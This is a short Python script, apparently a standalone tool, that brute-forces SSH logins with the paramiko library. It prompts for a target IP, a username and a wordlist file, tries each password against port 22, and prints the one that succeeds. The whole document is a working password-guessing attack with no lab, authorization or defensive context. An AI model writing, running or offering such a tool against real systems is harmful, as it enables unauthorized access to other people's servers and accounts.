import paramiko
import sys
import os 

target_ip = str(input('Please Enter the target IP: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter the location of the password file : '))

if len(target_ip) ==0:
	raise Exception('Please enter Target address:')

def ssh_connect(password,code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(target_ip,port=22,username=username,password=password)
	except paramiko.AuthenticationException:
		code = 1
	ssh.close()
	return code

with open(password_file,'r') as file:
	for line in file.readlines():
		password = line.strip()

		try:
			response = ssh_connect(password)

			if response ==0:
				print('password found : ',password)
				exit()
			elif response == 1:
				print('no luck')
		except Exception as e:
				print(e)
				pass 
				
